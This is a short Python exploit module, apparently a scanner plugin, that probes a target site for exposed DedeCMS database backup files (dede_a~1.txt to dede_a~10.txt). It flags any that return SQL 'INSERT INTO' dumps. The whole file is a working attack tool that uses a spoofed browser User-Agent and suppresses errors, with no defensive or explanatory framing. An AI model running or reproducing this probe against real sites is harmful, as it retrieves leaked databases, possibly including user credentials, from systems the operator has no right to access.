import requests
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}


class Exploit:

    def attack(self, url):
        try:
            ret = []
            for i in range(1, 11):
                exp = '/data/backupdata/dede_a~{}.txt'.format(i)
                url_exp = url + exp
                res = requests.get(url=url_exp, headers=headers)
                code = res.status_code
                text = res.text
                if code == 200 and 'INSERT INTO' in text:
                    ret.append(url_exp)
            return "\n".join(ret)
        except Exception as e:
            pass